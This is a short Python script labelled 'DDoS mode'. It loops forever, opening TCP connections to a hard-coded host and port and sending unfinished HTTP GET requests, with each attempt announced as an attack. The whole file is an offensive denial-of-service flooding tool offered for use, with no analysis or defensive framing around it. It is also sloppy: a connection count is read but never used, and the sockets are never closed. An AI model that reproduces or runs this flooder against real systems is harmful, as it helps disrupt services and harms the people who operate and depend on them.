#!/usr/bin/python
import time, socket, os, sys, string

print("DDoS mode loaded")
host='10.1.1.50'
port=8080
message='asdf'
conn=input("How many connections do you want to make: ")
ip = socket.gethostbyname(host)
n = 0
def dos():
  try:
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ddos.connect((host, port))
    ddos.send("GET /%s HTTP/1.1\r\n" % message)
  except socket.error, msg:
    global n
    n = n+1
    print("|[Connection Failed] | %d", n )
  print ("|[DDoS Attack Engaged] |")
  #ddos.close()

while(1):
#for i in xrange(conn):
    dos()
